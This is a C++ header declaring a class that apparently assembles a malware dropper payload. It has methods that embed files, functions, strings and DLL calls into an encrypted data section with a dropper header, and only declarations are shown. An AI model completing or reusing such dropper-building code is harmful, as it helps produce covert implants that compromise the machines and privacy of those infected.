#pragma once

class RCSConfig;
class Components;

class RCSPayload
{
public:
	RCSPayload( RCSConfig& ini, Components& components );
	
	char const * const cooked() { return cooked_.get(); }
	std::size_t size() { return cookedSize_; }
	
	bool write(bf::path file);
	
private:
	RCSConfig& rcs_;
	Components& components_;
	
	boost::shared_array<char> cooked_;
	std::size_t cookedSize_;

	std::size_t embedFile_(const bf::path& path, DataSectionBlob& name, DataSectionCryptoPack& file, char* ptr);
	std::size_t embedFunction_( const DataBuffer& source, DataSectionBlob& func, char *ptr );
	std::size_t embedStrings_( RCSConfig &rcs, DropperHeader* header, char* ptr );
	std::size_t embedDllCalls_( DropperHeader* header, char* ptr );
	
	std::size_t offset_( char* ptr ) { return (DWORD)ptr - (DWORD)cooked_.get(); }
};
